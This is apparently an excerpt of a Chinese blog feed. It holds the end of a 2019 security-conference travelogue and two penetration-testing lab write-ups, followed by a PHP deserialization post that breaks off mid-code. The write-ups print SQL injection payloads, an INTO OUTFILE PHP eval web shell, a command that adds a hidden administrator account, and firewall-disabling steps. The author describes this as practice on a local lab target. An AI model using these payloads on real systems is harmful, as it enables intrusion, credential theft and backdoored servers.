Organizations）、网民。其次，协同评价体系的建立，离不开三个目标：一是找到共同目标是关键，二是数字化，计数（抱歉这里我有点忘记了，等待大佬补充），三是协同各个组织区间可以形成反馈的闭环，减少彼此之间的权益差。而相应的，协同的运营机制必须围绕几个点展开：运营方必须无利益倾向、参与方的权益如何保障（即涉及到协同机制的设立）。最后，如何让安全效率提高，协同机制因做到以下几点：不因信任门槛而导致效率较低、安全是为了提高效率，而不是为了损失效率、基于API比人工审核更重要、应用领域向新技术开放（区块链、AI）。</p><p>下图是道哥画的相应图：</p><h6 id=""><a href="#" class="headerlink" title=""></a><img src="/2019/05/01/2019杭州之旅-2050/1556690802796.png" alt="1556690802796"></h6><p>道哥还谈了谈对未来一些想法，每个人拥有一张身份护照和一张网络世界的虚拟护照；ngo管控各大经济体。</p><p>后面我们问了道哥一些问题，送了我们一句话，我记得很深：“不要浪费时间”。一语点醒梦中人啊，不需要害怕迷茫，干就是了。</p><p>接着就是宫旭清，宫老哥上啦，讲的是关于边缘计算的。</p><h4 id="宫旭清（百度安全高级产品经理）"><a href="#宫旭清（百度安全高级产品经理）" class="headerlink" title="宫旭清（百度安全高级产品经理）"></a>宫旭清（百度安全高级产品经理）</h4><p><img src="/2019/05/01/2019杭州之旅-2050/1556691938075.png" alt="1556691938075"></p><p>边缘计算，之前有听研究生学姐讲过，但是没怎么搞了解，这两天，仔细看看相关的资料，分享下一些学习链接（<a href="https://www.zhihu.com/question/62869157" target="_blank" rel="noopener">边缘计算是什么，和云计算的区别是什么？</a>、<a href="https://zh.wikipedia.org/zh/邊緣運算" target="_blank" rel="noopener">边缘运算</a>）</p><h5 id="边缘运算"><a href="#边缘运算" class="headerlink" title="边缘运算"></a>边缘运算</h5><p>宫老哥在边缘计算介绍这第一部分，讲了：什么是边缘计算？、边缘技术发展、边缘计算的市场规模。这些 我也不知道怎么跟大家分享，我就把我自己拍的照片放上去啦（怕误导）。</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556692724279.png" alt="1556692724279"></p><p>在边缘计算分类这第二部分讲了以下的点：</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556692811081.png" alt="1556692811081"></p><p><img src="/2019/05/01/2019杭州之旅-2050/1556692866629.png" alt="1556692866629"></p><p>在网络安全与边缘计算的结合部分这第三部分，有一下内容</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556692955558.png" alt="1556692955558"></p><p>然后讲了一个叫<code>DuerEdge</code>的平台框架，<img src="/2019/05/01/2019杭州之旅-2050/1E7E49E9.png" alt="img"></p><p><img src="/2019/05/01/2019杭州之旅-2050/1556693235570.png" alt="1556693235570"></p><p>对不起各位，这个我真的没接触过，我只记得清楚老哥着重强调了Kata Containers(安全性较高，老哥正在研究如何让其效率变得更高)和Docker（安全性低，效率不错）。然后讲述了下边缘计算的利用，通过其进行反爬虫，措施有欺骗、Bang掉、诱惑其下载假的数据。</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556693380065.png" alt="1556693380065"></p><p>再之后的提问环节中，有位老哥问道：“假如通过这种方式，那我花的人员成本会不会更多，比如说原本的中心云计算我只要两个人，那如果应用边缘计算这种技术，是否导致我的人员开销更大”“不会的，边缘计算采用的都是自动化的代码进行分析，过滤，才把最优数据交给中心处理”。嗯，真的，我就知道这么多，其他我啥都不知道，真不会。</p><h4 id="Peter-Wesley-澳大利亚研究员"><a href="#Peter-Wesley-澳大利亚研究员" class="headerlink" title="Peter Wesley (澳大利亚研究员)"></a>Peter Wesley (澳大利亚研究员)</h4><h5 id="黑客类型与性格差异分析"><a href="#黑客类型与性格差异分析" class="headerlink" title="黑客类型与性格差异分析"></a>黑客类型与性格差异分析</h5><p>这边，全程凭英语听力勉强听个大概，分享的是黑客类型及其不同类型之间的性格差异、中国黑客想对于其他国家黑客的优势点，主要阐述不同类型黑客的组合是构成一个团队强大的基本支柱。</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556696088911.png" alt="1556696088911"></p><p>当然，这位歪果仁大哥还用三国时不同人物来进行分析，其实能听懂还是非常有意思的。</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556696189879.png" alt="1556696189879"></p><p>而在后面列出了中国黑客跟其他国家黑客性格差异的不同点</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556696246512.png" alt="1556696246512"></p><h4 id="Ivan（哥伦比亚安全研究员）"><a href="#Ivan（哥伦比亚安全研究员）" class="headerlink" title="Ivan（哥伦比亚安全研究员）"></a>Ivan（哥伦比亚安全研究员）</h4><h5 id="安全威胁分析与防护"><a href="#安全威胁分析与防护" class="headerlink" title="安全威胁分析与防护"></a>安全威胁分析与防护</h5><p>嗯是的，又是<code>Ivan</code>，我个人非常喜欢这位歪果仁老哥，很和蔼，幽默。后面要了他微信号，嘿嘿。</p><p>先讲了下黑客与恶意攻击者的区别（直到现在不知道多少人还觉得黑客是贬义词来着）</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556697083899.png" alt="1556697083899"></p><p>其实大部分内容，在我们内部团聚就讲了，比如“安全是一种过程”、“为什么学网络安全”。这里讲一些，没讲的。</p><p>其中有个印象特别的深，如下图右侧标注部分，你能发现这是钓鱼网站吗，如果是我我可能还真会上当。</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556697218171.png" alt="1556697218171"></p><p>这里其实用到一个攻击，专业名称叫同形异义字攻击，这个其实挺老的事了，具体查看<a href="https://www.freebuf.com/articles/web/136729.html" target="_blank" rel="noopener">同形异义字”钓鱼攻击，钉钉中招</a>，其中有介绍哦。这里简单提一提，那个<code>a</code>其实不是英语字母的<code>a</code>，而是别的语言字母，只是看起来非常像。</p><p>继而将了钓鱼wifi</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556697843280.png" alt="1556697843280"></p><p>以及如何防御的措施</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556697887890.png" alt="1556697887890"></p><p>然后差不多就就结束了，哎，看着大家一个一个离去还是多多少少感叹时间过得真快，彼此告别。走出大厅，刚好一架飞机在头上盘旋，伴随着沉重的脚步，离开云栖小镇了，前往西湖订的酒店，口里念叨着，“有机会再见，伙伴们，2050”。</p><video src="https://jianghuxia.github.io/2019/05/01/2019杭州之旅-2050/VID_20190428_122534.mp4"></video><p><img src="/2019/05/01/2019杭州之旅-2050/IMG_20190428_122403.jpg" alt="IMG_20190428_122403"></p><p>大概17点到酒店后，收拾下，跟小北约了晚饭，他请客，吃的新白鹿（太饿了，后面的没拍清楚）。大半年没见，聊聊人生。</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556698783160.png" alt="1556698783160"></p><p>头像就不发了，给他留点面子，头型留个，哈哈。</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556698854701.png" alt="1556698854701">吃完逛逛，走到地铁，再次伤感告别，下次再见。</p><h3 id="0x04-Day"><a href="#0x04-Day" class="headerlink" title="0x04 Day"></a>0x04 Day</h3><p>这天啊，早上早早起来，走着去西湖玩，风景好多，好美，途经雷峰塔，一群鸭子划水</p><video src="https://jianghuxia.github.io/2019/05/01/2019杭州之旅-2050/VID_20190429_080443.mp4"></video><p>走过苏堤，白堤，走苏堤时看到一只小松鼠，挺萌的</p><video src="https://jianghuxia.github.io/2019/05/01/2019杭州之旅-2050/VID_20190429_084305.mp4"></video><p>后帮同学带了茶叶，乘地铁回酒店，吃了个饭，赶动车去啦。哦，顺便买了两只叫花鸡，还有一个手环，一个雕像小狗带回家。</p><p><img src="/2019/05/01/2019杭州之旅-2050/IMG_20190429_115330.jpg" alt="IMG_20190429_115330"></p><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>杭州，再见！希望下次见面，我能以更强大的姿势来到。</p><p><img src="/2019/05/01/2019杭州之旅-2050/IMG_20190426_201521.jpg" alt="IMG_20190426_201521"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2019.04.26，厦门，晴，在朝阳升起的一刻，一架飞机机翼划过亮光，带着呼啸，腾空而起，朝北掠去，而故事由此开始，……&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="2019" scheme="https://jianghuxia.github.io/tags/2019/"/>
    
  </entry>
  
  <entry>
    <title>渗透学习_Test_02</title>
    <link href="https://jianghuxia.github.io/2019/04/19/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-Test-02/"/>
    <id>https://jianghuxia.github.io/2019/04/19/渗透学习-Test-02/</id>
    <published>2019-04-19T11:26:10.000Z</published>
    <updated>2019-09-02T09:07:16.011Z</updated>
    
    <content type="html"><![CDATA[<p>渗透学习_Test_02，环境朋友给的，自己本地搭的，仅供学习参考</p><a id="more"></a> <h3 id="Test-02"><a href="#Test-02" class="headerlink" title="Test_02"></a>Test_02</h3><h3 id="1、后台登录万能密码"><a href="#1、后台登录万能密码" class="headerlink" title="1、后台登录万能密码"></a>1、后台登录万能密码</h3><p>输入域名，一个登陆页面</p><p><img src="/2019/04/19/渗透学习-Test-02/1563017088047.png" alt="1563017088047"></p><p>自己稍微想了一下，然后构造如下，账号正常填写即可，密码填<code>admin&#39; or 1=&#39;1</code></p><p><img src="/2019/04/19/渗透学习-Test-02/1563016686886.png" alt="1563016686886"></p><p>即可完成绕过，进入<code>1.php</code>页面</p><h3 id="2、文件读取漏洞原理"><a href="#2、文件读取漏洞原理" class="headerlink" title="2、文件读取漏洞原理"></a>2、文件读取漏洞原理</h3><p>通过查看<code>1.php</code>网页源代码</p><p><img src="/2019/04/19/渗透学习-Test-02/1563017263774.png" alt="1563017263774"></p><p>文本内容<code>asd#12rqo$wfas&amp;8dfp1a@wej</code></p><h3 id="3、旁站查询"><a href="#3、旁站查询" class="headerlink" title="3、旁站查询"></a>3、旁站查询</h3><p>起初看到这个蒙蔽了 ，试了半天，后面直接看了下解析，用到了<code>nslookup</code>命令，拍了拍脑袋，<code>tm</code>，怎么就没反应过来，恍然大悟。但是试了试发现还是不行，估摸着是<code>DNS</code>服务器没有配好。</p><h3 id="4、常规的sql注入"><a href="#4、常规的sql注入" class="headerlink" title="4、常规的sql注入"></a>4、常规的sql注入</h3><p>访问域名<code>110002-gesxg35f.wlz.com</code></p><p><img src="/2019/04/19/渗透学习-Test-02/1563020844741.png" alt="1563020844741"></p><p>随便测试了下，发现了注入点</p><p>尝试手工注入，<code>http://110002-gesxg35f.wlz.com/about.php?listid=6</code></p><p><img src="/2019/04/19/渗透学习-Test-02/1563021624482.png" alt="1563021624482"></p><p><code>order by 7</code>正常回显，<code>order by 8</code>不回显，所以当前表列数为<code>7</code>列</p><p><img src="/2019/04/19/渗透学习-Test-02/1563021675476.png" alt="1563021675476"></p><p><code>http://110002-gesxg35f.wlz.com/about.php?listid=6 and 1=2 union select 1,2,3,database(),5,6,7--</code></p><p><img src="/2019/04/19/渗透学习-Test-02/1563021983379.png" alt="1563021983379"></p><p><code>http://110002-gesxg35f.wlz.com/about.php?listid=6 and 1=2 union select 1,2,3,table_name,5,6,7 from information_schema.tables where table_schema = database()--</code></p><p><img src="/2019/04/19/渗透学习-Test-02/1563023020239.png" alt="1563023020239"></p><p><code>0x3531305F61646D696E20&lt;------&gt;510_admin</code></p><p><code>http://110002-gesxg35f.wlz.com/about.php?listid=6 and 1=2 union select 1,2,3,group_concat(column_name),5,6,7 from information_schema.columns where table_name = 0x3531305F61646D696E--</code>(如果使用limit，只能单独查询一个列名，并且不能与<code>group_concat</code>函数共用)</p><p><img src="/2019/04/19/渗透学习-Test-02/1563024479997.png" alt="1563024479997"></p><p><img src="/2019/04/19/渗透学习-Test-02/1563024657216.png" alt="1563024657216"></p><p><code>http://110002-gesxg35f.wlz.com/about.php?listid=6 and 1=2 union select 1,2,3,group_concat(mid,0x23,name,0x23,passwd),5,6,7 from 510_admin</code> </p><p><img src="/2019/04/19/渗透学习-Test-02/1563028160961.png" alt="1563028160961"></p><p>另外发现也可以进行基于时间的盲注（这个就必须写脚本跑了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://110002-gesxg35f.wlz.com/product.php?cid=2 and if(length(database())=6,sleep(3),1)--</span><br><span class="line"></span><br><span class="line">http://110002-gesxg35f.wlz.com/product.php?cid=2 and if(ascii(substr(database(),6,1))=115,sleep(3),1)--</span><br></pre></td></tr></table></figure><p>使用<code>sqlmap</code>跑出<code>510_admin</code>表</p><p><img src="/2019/04/19/渗透学习-Test-02/1563003274026.png" alt="1563003274026"></p><p><code>name:admin</code></p><p><code>passwd:admin123lwphp</code></p><p>然而发现并登不上去</p><p><img src="/2019/04/19/渗透学习-Test-02/1563003883351.png" alt="1563003883351"></p><h3 id="5、对mysql导入导出作限制的配置项secure-file-priv的了解"><a href="#5、对mysql导入导出作限制的配置项secure-file-priv的了解" class="headerlink" title="5、对mysql导入导出作限制的配置项secure_file_priv的了解"></a>5、对mysql导入导出作限制的配置项secure_file_priv的了解</h3><p><code>@@secure_file_priv</code></p><p>secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p><ul><li>ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</li><li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li><li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</li></ul><p><img src="/2019/04/19/渗透学习-Test-02/1563028566913.png" alt="1563028566913"></p><p>知道了具体路径，我们可以尝试导出一句话木马试试看。</p><h3 id="6、mysql导出一句话"><a href="#6、mysql导出一句话" class="headerlink" title="6、mysql导出一句话"></a>6、mysql导出一句话</h3><p>注意啊！这里如果用<code>&quot;\&quot;</code>，windows下需要两个,即<code>&quot;\\&quot;</code>！</p><p><code>http://110002-gesxg35f.wlz.com/about.php?listid=6 and 1=2 union select 1,2,3,&#39;&lt;?php eval($_POST[jianghu]);?&gt;&#39;,5,6,7 into outfile &#39;D:\\php\\WWW\\upload\\shell_jianghu.php&#39; --</code></p><p><img src="/2019/04/19/渗透学习-Test-02/1563030159640.png" alt="1563030159640"></p><p><img src="/2019/04/19/渗透学习-Test-02/1563030223146.png" alt="1563030223146"></p><p>发现上个目录，有个<code>flag.txt</code></p><p><img src="/2019/04/19/渗透学习-Test-02/1563030730334.png" alt="1563030730334"></p><p><img src="/2019/04/19/渗透学习-Test-02/1563030770863.png" alt="1563030770863"></p><p><code>jlsd3@weq4#rsd12fl89</code></p><h3 id="7、溢出提权"><a href="#7、溢出提权" class="headerlink" title="7、溢出提权"></a>7、溢出提权</h3><p>菜刀打开虚拟终端，发现没有打补丁，菜刀里面执行以下操作</p><p><img src="/2019/04/19/渗透学习-Test-02/1563031346410.png" alt="1563031346410"></p><p><img src="/2019/04/19/渗透学习-Test-02/1563031189011.png" alt="1563031189011"></p><p>额外点：</p><p><img src="/2019/04/19/渗透学习-Test-02/1563066926091.png" alt="1563066926091"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;渗透学习_Test_02，环境朋友给的，自己本地搭的，仅供学习参考&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透学习" scheme="https://jianghuxia.github.io/tags/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>渗透学习_Test_01</title>
    <link href="https://jianghuxia.github.io/2019/04/08/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-Test-01/"/>
    <id>https://jianghuxia.github.io/2019/04/08/渗透学习-Test-01/</id>
    <published>2019-04-08T05:36:03.000Z</published>
    <updated>2019-09-02T09:07:14.099Z</updated>
    
    <content type="html"><![CDATA[<p>渗透学习_Test_01，环境朋友给的，自己本地搭的，仅供学习参考</p><a id="more"></a> <h3 id="Test-01"><a href="#Test-01" class="headerlink" title="Test_01"></a>Test_01</h3><p>访问测试主机，修改host文件（C:\WINDOWS\system32\drivers\etc\hosts）添加一条新数据<code>192.168.110.130 010001-fd85sjfl.wlz.com</code></p><p>tracert命令根据域名，查看网络路由</p><p><img src="/2019/04/08/渗透学习-Test-01/1562910258274.png" alt="1562910258274"></p><p><code>namp</code>扫描测试主机，<code>nmap -T4 -A -v -Pn 010001-fd85sjfl.wlz.com</code>,发现存在<code>80</code>服务端口（8080端口服务为自己误开端口<code>apache</code>服务）和<code>445</code>端口</p><p><img src="/2019/04/08/渗透学习-Test-01/1562910441310.png" alt="1562910441310"></p><p>### </p><p>访问该测试靶机域名<code>http://010001-fd85sjfl.wlz.com</code></p><p><img src="/2019/04/08/渗透学习-Test-01/1562911063229.png" alt="1562911063229"></p><h4 id="扫描网站路径"><a href="#扫描网站路径" class="headerlink" title="扫描网站路径"></a>扫描网站路径</h4><p><img src="/2019/04/08/渗透学习-Test-01/1562919263050.png" alt="1562919263050"></p><p>其中<code>http://010001-fd85sjfl.wlz.com/admin/login.asp</code>为后台登陆网站</p><h4 id="sql注入–关卡一：获取网站管理员admin的密码"><a href="#sql注入–关卡一：获取网站管理员admin的密码" class="headerlink" title="sql注入–关卡一：获取网站管理员admin的密码"></a>sql注入–关卡一：获取网站管理员<code>admin</code>的密码</h4><p>随即稍稍浏览,发现可能存在sql注入页面<code>http://010001-fd85sjfl.wlz.com/docc/product_detail.asp?id=220</code></p><p><img src="/2019/04/08/渗透学习-Test-01/1562911273124.png" alt="1562911273124"></p><p>Microsoft JET Database Engine：是Microsoft Jet 数据库引擎，是 Access 数据库系统的一部分</p><p>手工注入尝试 <code>and 1=1</code>、 <code>and 1=2</code>  ，发现页面回显不同，且报错信息显示</p><p><img src="/2019/04/08/渗透学习-Test-01/1562911764871.png" alt="1562911764871"></p><p>注入步骤：</p><p><code>http://010001-fd85sjfl.wlz.com/docc/product_detail.asp?id=220 order by 19</code>回显正常</p><p><code>http://010001-fd85sjfl.wlz.com/docc/product_detail.asp?id=220 order by 20</code>回显错误</p><p>由此判断列数为20</p><p>其次，Access的系统表是msysobjects,且在web环境下没有访问权限，而sql sever的系统表是sysobjects,</p><p>在WEB环境下有访问权限。对于以下两条语句：</p><p> and (select count(*) from sysobjects)&gt;0</p><p> and (select count(*) from msysobjects)&gt;0</p><p>若数据库是sql sever，则第一条测试，网页回显正常，第二条则网页回显异常；若是Access则两条都会异常。而对于本次测试靶机，两条均回显异常，可判断为Access为其数据库，如下两图。</p><p><img src="/2019/04/08/渗透学习-Test-01/1562913114060.png" alt="1562913114060"></p><p><img src="/2019/04/08/渗透学习-Test-01/1562913149419.png" alt="1562913149419"></p><p>使用啊D注入工具，爆破出<code>admin</code>表的敏感数据</p><p><strong>账号<code>admin</code>密码<code>mp150</code>，关卡一：获取网站管理员<code>admin</code>的密码即完成。</strong></p><p><img src="/2019/04/08/渗透学习-Test-01/1562919386785.png" alt="1562919386785"></p><p>其中”检测表段”，使用爆破字典方式，根据回显正常与否判断是否猜表成功，如下</p><p><code>http://010001-fd85sjfl.wlz.com/docc/product_detail.asp?id=220 and exists (select * from [admin])</code></p><p>同理，”检测字段“也是使用爆破方式，根据回显正常与否判断是否猜表成功，如下</p><p><code>http://010001-fd85sjfl.wlz.com/docc/product_detail.asp?id=220 and exists (select [admin_name] from [admin])</code></p><p>最后，”检测内容“，为逐位拆解过程，数据包已存在该文档，方便后面分析。</p><p><code>http://010001-fd85sjfl.wlz.com/docc/product_detail.asp?id=220 and (select Count(1) from [admin] where 1=1) between 0 and 99999999</code></p><p><code>http://010001-fd85sjfl.wlz.com/docc/product_detail.asp?id=220 and (select Count(1) from [admin] where 1=1) between 0 and 4</code></p><p><img src="/2019/04/08/渗透学习-Test-01/1562918865070.png" alt="1562918865070"></p><p>附上学习链接</p><p><a href="https://www.cnblogs.com/szm666888/p/4928437.html" target="_blank" rel="noopener">access注入（新手菜鸟随笔）</a></p><h4 id="EWebeditor漏洞利用–关卡二：获取网站根目录下含有“第二关”字样的文本文件的内容"><a href="#EWebeditor漏洞利用–关卡二：获取网站根目录下含有“第二关”字样的文本文件的内容" class="headerlink" title="EWebeditor漏洞利用–关卡二：获取网站根目录下含有“第二关”字样的文本文件的内容"></a>EWebeditor漏洞利用–关卡二：获取网站根目录下含有“第二关”字样的文本文件的内容</h4><p>使用账号<code>admin</code>密码<code>mp150</code>登录<code>http://010001-fd85sjfl.wlz.com/admin/login.asp</code>后台管理页面</p><p>浏览几个功能，发现有个”产品功能“里面存在一个”添加“功能，点击为一个网页编辑器，如下图，使用谷歌浏览器可以点击右键”查看框架的源代码“</p><p><img src="/2019/04/08/渗透学习-Test-01/1562920878265.png" alt="1562920878265"></p><p>注：火狐浏览器查看网页源代码无法查看框架源代码</p><p><img src="/2019/04/08/渗透学习-Test-01/1562921308399.png" alt="1562921308399"></p><p>查看过程中发现<code>EWebeditor</code>路径<code>/admin/Components/ewebeditor/</code></p><p><img src="/2019/04/08/渗透学习-Test-01/1562921146637.png" alt="1562921146637"></p><p>点击进入，随后微微更改<code>uri</code>为<code>admin/Components/ewebeditor/admin_login.asp</code>,成功访问后台，但尝试默认账号密码<code>admin/admin</code>以及其他弱口令登录均失败，尝试<code>burpsuite</code>爆破成功了。</p><p><img src="/2019/04/08/渗透学习-Test-01/1562921761396.png" alt="1562921761396"></p><p>想起<code>eWebEditor</code>默认数据库为<code>eWebEditor.mdb</code></p><p>遂尝试访问<code>/admin/Components/ewebeditor/db/eWebEditor.mdb</code>，发现可下载该数据库</p><p><img src="/2019/04/08/渗透学习-Test-01/1562921909515.png" alt="1562921909515"></p><p>使用<code>辅臣数据库浏览器V1.0</code>分析</p><p><img src="/2019/04/08/渗透学习-Test-01/1562922581312.png" alt="1562922581312"></p><p><code>MD5</code>解密<code>sys_UserName(7a57a5a743894a0e)</code>为<code>admin</code></p><p><code>MD5</code>解密<code>sys_UserPass(4621d373cade4e83)</code>为<code>test</code></p><p>登陆后台</p><p><img src="/2019/04/08/渗透学习-Test-01/1562936434677.png" alt="1562936434677"></p><p>点击“样式管理”，选择样式名为<code>standard</code>，再选择“拷贝”</p><p><img src="/2019/04/08/渗透学习-Test-01/1562939003905.png" alt="1562939003905"></p><p>紧接着修改图片类型，新增<code>|asa|asp|asax|asx</code></p><p><img src="/2019/04/08/渗透学习-Test-01/1562938942904.png" alt="1562938942904"></p><p>提交之后，点击预览</p><p><img src="/2019/04/08/渗透学习-Test-01/1562938863899.png" alt="1562938863899"></p><p>随后点击“设计”，上传一句话木马，后缀名为<code>asa</code>（虽然上面图片类型添加了asp，但是这边还是被过滤掉了）</p><p><img src="/2019/04/08/渗透学习-Test-01/1562938214594.png" alt="1562938214594"></p><p>紧接着点击“代码”，查看刚刚上传的完整路径</p><p><img src="/2019/04/08/渗透学习-Test-01/1562939805546.png" alt="1562939805546"></p><p>使用菜刀尝试连接</p><p><img src="/2019/04/08/渗透学习-Test-01/1562939936399.png" alt="1562939936399"></p><p>连接成功</p><p><img src="/2019/04/08/渗透学习-Test-01/1562939980377.png" alt="1562939980377"></p><p>完成<strong>关卡二：获取网站根目录下含有“第二关”字样的文本文件的内容</strong></p><p><code>ad0234829205b9033196ba818f7a872b</code></p><h4 id="Serv-U-ftp提权操作–关卡三：登陆远程终端在“我的计算机”上右键查看属性，获取“常规”选项卡下面的”注册到-my-test”下面的注册序列号，格式如x-y-z-m"><a href="#Serv-U-ftp提权操作–关卡三：登陆远程终端在“我的计算机”上右键查看属性，获取“常规”选项卡下面的”注册到-my-test”下面的注册序列号，格式如x-y-z-m" class="headerlink" title="Serv-U ftp提权操作–关卡三：登陆远程终端在“我的计算机”上右键查看属性，获取“常规”选项卡下面的”注册到:my-test”下面的注册序列号，格式如x-y-z-m"></a>Serv-U ftp提权操作–关卡三：登陆远程终端在“我的计算机”上右键查看属性，获取“常规”选项卡下面的”注册到:my-test”下面的注册序列号，格式如x-y-z-m</h4><p>毫无疑问，第三关需要我们进行提权操作了，但是如何提权呢？其实在刚开始扫端口的时候就发现存在FTP服务了，尝试<code>ftp 010001-fd85sjfl.wlz.com</code></p><p><img src="/2019/04/08/渗透学习-Test-01/1562973741290.png" alt="1562973741290"></p><p>并且通过关卡二中方法上传大马，进行端口扫描，也发现了<code>43958</code>端口的开放，至于为啥<code>nmap</code>没扫出来43958，应该是做了一个访问策略控制。</p><p>尝试直接进行<code>Serv-U</code>提权操作</p><p><img src="/2019/04/08/渗透学习-Test-01/1562974458333.png" alt="1562974458333"></p><p>本以为成功了，半天远程登录登不上去（这个大马有毛病）</p><p>后面看了解析，原来试大马查找Serv-U默认路径：<code>C:\Program Files\Serv-U\</code>中的<code>ServUDacmon.ini</code></p><p><img src="/2019/04/08/渗透学习-Test-01/1562974119114.png" alt="1562974119114"></p><p>将<em><code>xt1B6287DD6EC58EB7DA0F1B8961C452C4</code></em>,解密的结果为<em><code>xtab1</code></em></p><p>但是问题来了，可能脑袋昏了，我都上了小马，为啥大马还像上下马一样上呢，然后折腾了好久，最后才反应过来，日了狗了，艹，换成<code>aspx</code>的大马，可以执行<code>cmd</code>命令了，<code>asp</code>的大马执行不了，为啥？</p><p><img src="/2019/04/08/渗透学习-Test-01/1562984496727.png" alt="1562984496727"></p><p>然后点击到 <code>SU Exp</code>，默认密码错误，提权失败</p><p><img src="/2019/04/08/渗透学习-Test-01/1562984750943.png" alt="1562984750943"></p><p>将之前的<code>xtab1</code>填入密码框中，执行命令，还是不行，换成<code>ab1</code>成了（前两个字母<code>xt</code>去掉）</p><p><img src="/2019/04/08/渗透学习-Test-01/1562984895977.png" alt="1562984895977"></p><p><code>cmd /c net user jianghu$ jianghu /add &amp; net localgroup administrators jianghu$ /add</code></p><p><img src="/2019/04/08/渗透学习-Test-01/1562985120146.png" alt="1562985120146"></p><p>然后依旧试着远程登录，还是不行</p><p><img src="/2019/04/08/渗透学习-Test-01/1562985553981.png" alt="1562985553981"></p><p>看下服务，应该是防火墙开着了</p><p><img src="/2019/04/08/渗透学习-Test-01/1562985478513.png" alt="1562985478513"></p><p>普通的<code>cmd</code>执行下，还是不行</p><p><img src="/2019/04/08/渗透学习-Test-01/1562985637978.png" alt="1562985637978"></p><p><code>SU Exp</code>提权下执行<code>cmd /c net stop PolicyAgent</code></p><p><img src="/2019/04/08/渗透学习-Test-01/1562985914712.png" alt="1562985914712"></p><p><img src="/2019/04/08/渗透学习-Test-01/1562985689221.png" alt="1562985689221"></p><p>再次尝试，发现已经有登录框了</p><p><img src="/2019/04/08/渗透学习-Test-01/1562985746099.png" alt="1562985746099"></p><p>输入密码，成功远程登录</p><p><img src="/2019/04/08/渗透学习-Test-01/1562986176627.png" alt="1562986176627"></p><p>获取到系统注册序列号为<code>69813-640-2954314-45562</code></p><p>额外一：</p><p>其实在测试过程中，发现用户名后面加个$，netuser是看不到这个隐藏用户的，win2003按以下方式可以查看隐藏的用户</p><p><img src="/2019/04/08/渗透学习-Test-01/1562986623791.png" alt="1562986623791"></p><p>额外二：</p><p>or 1=2正常回显？？？</p><p><img src="/2019/04/08/渗透学习-Test-01/1562911837551.png" alt="1562911837551"></p><p>or 1=1错误信息？？？</p><p><img src="/2019/04/08/渗透学习-Test-01/1562911964864.png" alt="1562911964864"></p><p>然后后面看了这个，还是没懂</p><p><img src="/2019/04/08/渗透学习-Test-01/1562987220865.png" alt="1562987220865"></p><p><img src="/2019/04/08/渗透学习-Test-01/1562987674992.png" alt="1562987674992"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;渗透学习_Test_01，环境朋友给的，自己本地搭的，仅供学习参考&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透学习" scheme="https://jianghuxia.github.io/tags/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>serialize与unserialize</title>
    <link href="https://jianghuxia.github.io/2019/03/20/serialize%E4%B8%8Eunserialize/"/>
    <id>https://jianghuxia.github.io/2019/03/20/serialize与unserialize/</id>
    <published>2019-03-20T10:55:02.000Z</published>
    <updated>2019-03-20T10:59:20.247Z</updated>
    
    <content type="html"><![CDATA[<p>相对于网上其他关于Serialize的讲解，不下万篇，学习笔记，稍微总结一番。本篇文章按照<a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">浅谈php反序列化漏洞</a>，进行学习指导，基础内容略过。</p><a id="more"></a> <h3 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h3><p>先举个例子说明<code>serialize()</code>与<code>unserialize()</code></p><p><img src="/2019/03/20/serialize与unserialize/1552959114112.png" alt="1552959114112"></p><p>显而易见，两个函数的例子所表达的形式就是这么简单。</p><h3 id="再捡个栗子"><a href="#再捡个栗子" class="headerlink" title="再捡个栗子"></a>再捡个栗子</h3><p>接下来看看下面的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type:text;charset=utf-8'</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"hahaha"</span>;</span><br><span class="line">    <span 